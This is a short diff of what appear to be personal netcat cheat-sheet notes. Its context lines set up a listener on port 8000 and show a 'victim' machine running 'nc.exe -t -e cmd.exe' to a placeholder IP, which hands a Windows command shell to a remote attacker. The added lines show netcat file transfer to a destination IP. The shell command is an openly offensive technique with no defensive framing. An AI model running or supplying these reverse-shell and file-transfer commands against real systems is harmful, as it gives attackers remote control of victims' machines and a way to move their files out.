@@ -94,3 +94,7 @@ nc xxx.xxx.xxx.xxx 8000
 nc -vv -l -p 8000
 #the victim  connect
 nc.exe -t -e cmd.exe xxx.xxx.xxx.xxx 8000
+
+#nc file trans
+nc -l -p  8000 > test.txt
+nc dst_ip 8000 < test.txt    
